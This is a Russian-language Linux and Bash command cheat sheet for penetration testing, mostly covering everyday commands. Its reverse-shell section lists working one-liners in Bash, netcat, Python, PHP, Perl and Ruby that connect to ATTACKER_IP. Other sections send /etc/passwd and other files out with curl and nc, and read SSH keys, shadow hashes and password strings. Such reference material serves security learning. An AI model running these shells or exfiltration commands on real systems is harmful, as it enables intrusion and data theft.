<a id="-linux-commands--bash---complete-pentesting-cheatsheet"></a>
# 🐧 Команды Linux и Bash — полная шпаргалка для пентеста

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)


> **Уточнения к оригиналу:** ll — необязательный псевдоним, а параметры nc и доступность устаревших сетевых утилит зависят от установленной реализации. Отдельные строки if в разделе сравнений — фрагменты синтаксиса: полноценная конструкция требует тела и закрывающего fi; см. [руководство Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html). В примере awk с $3 для /etc/passwd не указан разделитель полей: по умолчанию [FS разделяет по пробельным символам](https://www.gnu.org/software/gawk/manual/html_node/Field-Splitting-Summary.html), тогда как поля этого файла разделены двоеточием. Примеры сохранены буквально.

> **Пояснение схемы прав:** Owner — владелец, Group — группа, Others — остальные; r — чтение, w — запись, x — исполнение. File type обозначает тип объекта: - — обычный файл, d — каталог. Схема оставлена без изменений для сохранения выравнивания.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Навигация и файлы](#-navigation--files)
- [Сбор сведений о системе](#-system-enumeration)
- [Сбор сведений о пользователях](#-user-enumeration)
- [Сетевые команды](#-network-commands)
- [Поиск и анализ файлов](#-file-search--analysis)
- [Обработка текста](#-text-processing)
- [Права доступа и владельцы](#-permissions--ownership)
- [Управление процессами](#-process-management)
- [Управление пакетами](#-package-management)
- [Написание скриптов Bash](#-bash-scripting)
- [Обратные командные оболочки](#-reverse-shells)
- [Передача файлов](#-file-transfers)
- [Однострочные команды](#-one-liners)

---

<a id="-navigation--files"></a>
## 📁 Навигация и файлы

<a id="directory-navigation"></a>
### Перемещение по каталогам

```bash
# Текущий каталог
pwd

# Сменить каталог
cd /path/to/dir
cd ..          # Родительский каталог
cd ~           # Домашний каталог
cd -           # Предыдущий каталог

# Список файлов
ls
ls -la         # Подробный формат, все файлы
ls -lah        # Размеры в удобочитаемом виде
ls -latr       # Сортировать по времени в обратном порядке
ll             # Псевдоним для ls -la (зависит от настройки оболочки)
```

<a id="file-operations"></a>
### Операции с файлами

```bash
# Создать файлы или каталоги
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Создать родительские каталоги

# Копирование
cp source dest
cp -r source_dir dest_dir  # Рекурсивно

# Переместить или переименовать
mv source dest
mv oldname newname

# Удаление
rm file
rm -r directory            # Рекурсивно
rm -rf directory           # Принудительно, без запроса подтверждения

# Просмотр файлов
cat file.txt
less file.txt              # Постраничный просмотр
more file.txt
head -n 20 file.txt        # Первые 20 строк
tail -n 20 file.txt        # Последние 20 строк
tail -f file.txt           # Следить за дополнением файла
```

<a id="archives--compression"></a>
### Архивы и сжатие

```bash
# tar
tar -cvf archive.tar files/      # Создать
tar -xvf archive.tar             # Извлечь
tar -czvf archive.tar.gz files/  # Создать архив с gzip-сжатием
tar -xzvf archive.tar.gz         # Извлечь архив с gzip-сжатием

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

<a id="-system-enumeration"></a>
## 🔍 Сбор сведений о системе

<a id="system-information"></a>
### Сведения о системе

```bash
# Имя узла
hostname
hostname -I               # IP-адреса

# ОС и ядро
uname -a                  # Все сведения
uname -r                  # Версия ядра
cat /etc/os-release       # Сведения об ОС
cat /etc/issue            # Баннер ОС
cat /proc/version         # Сведения о ядре и компиляторе

# Архитектура
arch
uname -m

# Оборудование
lscpu                     # Сведения о процессоре
cat /proc/cpuinfo
free -h                   # Память
df -h                     # Дисковое пространство
lsblk                     # Блочные устройства
```

<a id="environment"></a>
### Окружение

```bash
# Переменные окружения
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Задать переменную
export VAR="value"
VAR="value"
```

<a id="running-services"></a>
### Запущенные службы

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Проверить прослушиваемые порты
ss -tulpn
netstat -tulpn
```

<a id="cron-jobs"></a>
### Задания cron

```bash
# Задания crontab пользователя
crontab -l

# Системные задания crontab
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Наблюдать за заданиями cron (с помощью pspy)
./pspy64
```

<a id="installed-packages"></a>
### Установленные пакеты

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Найти пакет
dpkg -l | grep package
which binary
whereis binary
```

---

<a id="-user-enumeration"></a>
## 👤 Сбор сведений о пользователях

<a id="current-user"></a>
### Текущий пользователь

```bash
# Определить текущего пользователя
whoami
id
id username

# Группы
groups
groups username

# Привилегии
sudo -l                   # Разрешения sudo
cat /etc/sudoers          # Файл sudoers (обычно нужны права root)
```

<a id="all-users"></a>
### Все пользователи

```bash
# Список пользователей
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Пользователи с командной оболочкой
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Хеши паролей (нужны права root)
cat /etc/shadow

# Недавние входы в систему
last
lastlog
w
who
users
```

<a id="interesting-files"></a>
### Файлы, представляющие интерес

```bash
# Ключи SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# История команд
cat ~/.bash_history
cat ~/.zsh_history
history

# Файлы конфигурации
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

<a id="-network-commands"></a>
## 🌐 Сетевые команды

<a id="network-configuration"></a>
### Настройка сети

```bash
# IP-адрес
ip a
ip addr show
ifconfig

# Маршруты
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Таблица ARP
arp -a
ip neigh
```

<a id="open-ports--connections"></a>
### Открытые порты и соединения

```bash
# Прослушиваемые порты
ss -tulpn
ss -tlnp                  # Только TCP
netstat -tulpn
netstat -ano

# Активные соединения
ss -tup
netstat -an | grep ESTABLISHED

# Найти процесс по порту
lsof -i :80
fuser 80/tcp
```

<a id="network-testing"></a>
### Проверка сети

```bash
# Ping
ping -c 4 host

# Трассировка маршрута
traceroute host
tracepath host

# Запрос DNS
host domain.com
dig domain.com
nslookup domain.com

# Проверка порта
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Только заголовки
curl -s http://host       # Без индикатора выполнения
curl -k https://host      # Отключить проверку сертификата TLS
wget http://host/file
```

<a id="firewall"></a>
### Межсетевой экран

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

<a id="-file-search--analysis"></a>
## 🔎 Поиск и анализ файлов

<a id="find-command"></a>
### Команда find

```bash
# Поиск по имени
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Без учёта регистра

# Поиск по типу
find / -type f -name "*.conf"          # Файлы
find / -type d -name "backup"          # Каталоги

# Поиск по правам доступа
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Доступно для записи всем

# Поиск по владельцу
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Поиск по размеру
find / -size +100M 2>/dev/null         # Больше 100 МБ
find / -size -1k 2>/dev/null           # Меньше 1 КБ

# Поиск по времени
find / -mtime -7 2>/dev/null           # Изменено за последние 7 дней
find / -atime +30 2>/dev/null          # Последний доступ более 30 дней назад

# Найти и выполнить действие
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

<a id="grep-search-in-files"></a>
### Grep (поиск в файлах)

```bash
# Обычный поиск
grep "pattern" file
grep -i "pattern" file                 # Без учёта регистра
grep -r "pattern" /path/               # Рекурсивно
grep -rn "pattern" /path/              # С номерами строк

# Обратное совпадение
grep -v "pattern" file                 # Строки, НЕ соответствующие шаблону

# Число совпадающих строк
grep -c "pattern" file

# Показать контекст
grep -A 3 "pattern" file               # 3 строки после
grep -B 3 "pattern" file               # 3 строки перед
grep -C 3 "pattern" file               # По 3 строки до и после

# Регулярное выражение
grep -E "regex" file                   # Расширенное регулярное выражение
egrep "regex" file

# Несколько шаблонов
grep -E "pattern1|pattern2" file
```

<a id="locate--which"></a>
### Locate и Which

```bash
# Locate (требуется база updatedb)
locate filename
updatedb                               # Обновить базу данных

# Which (найти исполняемый файл)
which binary
whereis binary
type command
```

<a id="file-analysis"></a>
### Анализ файлов

```bash
# Тип файла
file filename

# Строки в исполняемом файле
strings binary
strings binary | grep password

# Шестнадцатеричный дамп
xxd file
hexdump -C file

# Хеш
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-text-processing"></a>
## ✂️ Обработка текста

<a id="cut"></a>
### Cut

```bash
# Разделить по разделителю
cut -d: -f1 /etc/passwd                # Первое поле, разделитель :
cut -d: -f1,3 /etc/passwd              # Поля 1 и 3

# Выделить по позициям символов
cut -c1-10 file                        # Символы с 1 по 10
```

<a id="awk"></a>
### Awk

```bash
# Вывести столбцы
awk '{print $1}' file                  # Первый столбец
awk '{print $1, $3}' file              # Столбцы 1 и 3
awk -F: '{print $1}' /etc/passwd       # Заданный разделитель

# Условия
awk '$3 > 1000' /etc/passwd            # Где поле 3 > 1000
awk '/pattern/ {print $1}' file        # Строки, соответствующие шаблону

# Встроенные переменные
awk '{print NR, $0}' file              # Номера строк
awk 'END {print NR}' file              # Общее число строк
```

<a id="sed"></a>
### Sed

```bash
# Замена
sed 's/old/new/' file                  # Первое вхождение
sed 's/old/new/g' file                 # Все вхождения
sed -i 's/old/new/g' file              # Изменить сам файл

# Удалить строки
sed '/pattern/d' file                  # Удалить совпадающие строки
sed '5d' file                          # Удалить строку 5
sed '1,5d' file                        # Удалить строки с 1 по 5

# Вывести определённые строки
sed -n '5p' file                       # Вывести строку 5
sed -n '1,10p' file                    # Вывести строки с 1 по 10
```

<a id="sort--uniq"></a>
### Sort и Uniq

```bash
# Сортировка
sort file
sort -r file                           # В обратном порядке
sort -n file                           # Числовой режим
sort -u file                           # Только уникальные строки
sort -t: -k3 -n /etc/passwd            # По полю 3

# Уникальные строки
uniq file                              # Удалить соседние дубликаты
sort file | uniq                       # Удалить все дубликаты
uniq -c file                           # Подсчитать повторения
sort file | uniq -c | sort -rn         # Подсчитать и отсортировать
```

<a id="other-useful"></a>
### Другие полезные команды

```bash
# Подсчёт содержимого
wc -l file                             # Строки
wc -w file                             # Слова
wc -c file                             # Байты

# Форматирование столбцов
column -t file                         # Выровнять по столбцам
column -s: -t /etc/passwd              # Заданный разделитель

# tr (преобразование символов)
echo "HELLO" | tr 'A-Z' 'a-z'          # Преобразовать в нижний регистр
cat file | tr -d '\n'                  # Удалить переводы строк

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

<a id="-permissions--ownership"></a>
## 🔐 Права доступа и владельцы

<a id="understanding-permissions"></a>
### Как читать права доступа

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Others (r-x = 5)
│ │  └───── Group  (r-x = 5)
│ └──────── Owner  (rwx = 7)
└────────── File type (- = file, d = directory)
```

<a id="chmod"></a>
### Chmod

```bash
# Числовой режим
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Символьный режим
chmod +x file                          # Добавить право исполнения
chmod -w file                          # Убрать право записи
chmod u+x file                         # Исполнение для владельца
chmod g+w file                         # Запись для группы
chmod o-r file                         # Убрать чтение для остальных

# Рекурсивно
chmod -R 755 directory/
```

<a id="chown"></a>
### Chown

```bash
# Сменить владельца
chown user file
chown user:group file
chown -R user:group directory/

# Сменить только группу
chgrp group file
```

<a id="special-permissions"></a>
### Специальные права доступа

```bash
# SUID (Set User ID) — 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) — 2
chmod g+s directory
chmod 2755 directory

# Sticky bit — 1
chmod +t directory
chmod 1755 directory

# Найти SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-process-management"></a>
## ⚙️ Управление процессами

<a id="view-processes"></a>
### Просмотр процессов

```bash
# Список процессов
ps aux
ps -ef
ps aux | grep process_name

# Top (обновление в реальном времени)
top
htop                                   # Расширенный интерактивный просмотр

# Дерево процессов
pstree
ps auxf
```

<a id="process-control"></a>
### Управление выполнением процессов

```bash
# Фоновый и передний план
command &                              # Запустить в фоне
Ctrl+Z                                 # Приостановить
bg                                     # Возобновить в фоне
fg                                     # Вернуть на передний план
jobs                                   # Список заданий оболочки

# Завершить процесс
kill PID
kill -9 PID                            # Принудительно завершить
killall process_name
pkill process_name

# Nice (приоритет)
nice -n 10 command                     # Понизить приоритет
renice 10 -p PID
```

---

<a id="-package-management"></a>
## 📦 Управление пакетами

<a id="debianubuntu-aptdpkg"></a>
### Debian/Ubuntu (apt/dpkg)

```bash
# Обновление
apt update
apt upgrade

# Установка
apt install package
dpkg -i package.deb

# Удаление
apt remove package
apt purge package                      # Удалить вместе с конфигурацией

# Поиск
apt search package
apt-cache search package

# Сведения
apt show package
dpkg -l | grep package
```

<a id="rhelcentos-yumdnf"></a>
### RHEL/CentOS (yum/dnf)

```bash
# Обновление
yum update
dnf update

# Установка
yum install package
dnf install package

# Удаление
yum remove package

# Поиск
yum search package

# Сведения
yum info package
rpm -qa | grep package
```

---

<a id="-bash-scripting"></a>
## 💻 Написание скриптов Bash

<a id="basics"></a>
### Основы

```bash
#!/bin/bash

# Переменные
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Подстановка результата команды
DATE=$(date)
FILES=`ls -la`

# Прочитать ввод
read -p "Enter name: " NAME
echo "Hello $NAME"
```

<a id="conditionals"></a>
### Условные конструкции

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Сравнения строк
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Пустая строка
if [ -n "$str" ]; then                 # Непустая строка

# Сравнения чисел
if [ $num1 -eq $num2 ]; then           # Равно
if [ $num1 -ne $num2 ]; then           # Не равно
if [ $num1 -gt $num2 ]; then           # Больше
if [ $num1 -lt $num2 ]; then           # Меньше

# Проверки файлов
if [ -e file ]; then                   # Существует
if [ -f file ]; then                   # Обычный файл
if [ -d dir ]; then                    # Каталог
if [ -r file ]; then                   # Доступен для чтения
if [ -w file ]; then                   # Доступен для записи
if [ -x file ]; then                   # Доступен для исполнения
```

<a id="loops"></a>
### Циклы

```bash
# Цикл for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# Цикл while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# Цикл for в стиле C
for ((i=0; i<10; i++)); do
    echo $i
done
```

<a id="functions"></a>
### Функции

```bash
# Определить функцию
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Вызвать функцию
function_name arg1 arg2
```

<a id="script-example"></a>
### Пример скрипта

```bash
#!/bin/bash
# Сканер портов

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

<a id="-reverse-shells"></a>
## 🔌 Обратные командные оболочки (reverse shells)

<a id="bash"></a>
### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

<a id="netcat"></a>
### Netcat

```bash
# nc с параметром -e
nc -e /bin/bash ATTACKER_IP PORT

# nc без параметра -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

<a id="python"></a>
### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

<a id="php"></a>
### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<a id="perl"></a>
### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

<a id="ruby"></a>
### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

<a id="upgrade-shell"></a>
### Улучшение интерактивной оболочки

```bash
# Запустить псевдотерминал (TTY)
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Полноценный интерактивный терминал
# В обратной командной оболочке:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# На системе тестирующего:
stty raw -echo; fg
# В командной оболочке:
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-file-transfers"></a>
## ⬇️ Передача файлов

<a id="from-attacker-to-target"></a>
### От тестирующего к целевой системе

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# На системе тестирующего: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (для небольших файлов)
# На системе тестирующего: base64 file
echo "BASE64_STRING" | base64 -d > file
```

<a id="from-target-to-attacker"></a>
### От целевой системы к тестирующему

```bash
# nc
# На системе тестирующего: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Скопировать вывод на систему тестирующего и декодировать
```

<a id="start-http-server"></a>
### Запуск HTTP-сервера

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

<a id="-one-liners"></a>
## ⚡ Однострочные команды

<a id="useful-pentest-one-liners"></a>
### Полезные однострочные команды для пентеста

```bash
# Найти исполняемые файлы с SUID
find / -perm -4000 -type f 2>/dev/null

# Найти каталоги с правом записи
find / -writable -type d 2>/dev/null

# Найти файлы, доступные всем для записи
find / -perm -o+w -type f 2>/dev/null

# Найти файлы конфигурации с паролями
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Найти ключи SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Быстрое сканирование портов
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Проверка доступности узлов по диапазону
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Извлечь IP-адреса из файла
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Кодирование и декодирование Base64
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# Кодирование и декодирование URL
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

<a id="quick-reference-table"></a>
### Краткая справочная таблица

| Назначение | Команда |
|---------|---------|
| Текущий пользователь | `whoami` / `id` |
| Сведения о системе | `uname -a` |
| IP-адрес | `ip a` / `hostname -I` |
| Открытые порты | `ss -tulpn` |
| Запущенные процессы | `ps aux` |
| Поиск SUID | `find / -perm -4000 2>/dev/null` |
| Каталоги с правом записи | `find / -writable -type d 2>/dev/null` |
| Скачивание файла | `wget http://url/file` |
| Обратная командная оболочка | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Получение полноценного терминала (TTY) | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

<a id="-resources"></a>
## 📚 Полезные материалы

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Шпаргалка по обратным оболочкам](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Повышение привилегий в Linux](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.ru.md)

---

<p align="center">
  <b>🐧 Осваивайте Linux для тестирования на проникновение!</b><br>
  <i>Командная строка — ваш надёжный помощник</i>
</p>
